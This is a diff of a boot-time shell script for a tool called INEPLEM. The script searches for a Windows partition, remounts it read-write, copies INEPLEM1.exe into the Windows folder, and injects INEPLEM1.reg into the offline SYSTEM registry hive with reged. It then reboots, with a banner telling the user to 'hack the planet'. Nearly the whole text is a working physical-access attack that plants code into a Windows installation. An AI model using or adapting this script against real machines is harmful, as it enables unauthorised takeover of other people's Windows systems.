@@ -6,33 +6,52 @@ busybox mount -t sysfs sysfs /sys
 busybox mount -t devtmpfs devtmpfs /dev
 
 busybox clear
-echo -n "."
-for f in $(busybox fdisk -l | busybox grep NTFS | busybox cut -d " " -f 1)
+echo "################################################################################"
+echo "#                                   INEPLEM                                    #"
+echo "################################################################################"
+echo "# Searching Windows NTFS Drive....                                             #"
+for f in $(busybox fdisk -l | busybox grep -E "(NTFS|EFI GPT)" | busybox cut -d " " -f 1)
 do
+	printf "# Trying $f...    "
 	ntfs-3g -o ro $f /mnt
 	if [ ! -d "/mnt/Windows/System32" ]; then
+		echo "NO                                                    #"
 		busybox umount /mnt
 		continue
 	fi
+	echo "YES                                                   #"
+	echo "################################################################################"
 	busybox umount /mnt
 	ntfs-3g -o rw $f /mnt
-	echo -n "."
+	echo "# Drive mounted in RW                                                          #"
 	busybox cp /share/INEPLEM1.exe /mnt/Windows/INEPLEM1.exe
-	echo -n "."
+	echo "# INEPLEM1.exe copied                                                          #"
 	reged -C -I /mnt/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE\\SYSTEM /share/INEPLEM1.reg > /dev/null
-	echo -n "."
+	echo "# INEPLEM1.reg applied                                                         #"
+	echo "# sha1 from copied file and reg :                                              #"
+	busybox sha1sum /share/INEPLEM1.reg /mnt/Windows/INEPLEM1.exe
+	echo "# cat of /share/INEPLEM.sha                                                    #"
+	busybox cat /share/INEPLEM.sha
 	busybox umount /mnt
-	busybox sync
+	#busybox sync
+	echo "# File system unmounted                                                        #"
+	echo "################################################################################"
 	break
 done
-echo -n "."
+echo "# INEPLEM have been installed !                                                #"
+echo "# Press ENTER to reboot and hack the planet !                                  #"
+echo "################################################################################"
 read i
 busybox clear
-echo "OK"
+printf "OK"
 
 echo e > /proc/sysrq-trigger
+printf "."
 busybox sleep 0.1s
 echo i > /proc/sysrq-trigger
+printf "."
 echo s > /proc/sysrq-trigger
+printf "."
 echo u > /proc/sysrq-trigger
+printf "."
 echo b > /proc/sysrq-trigger
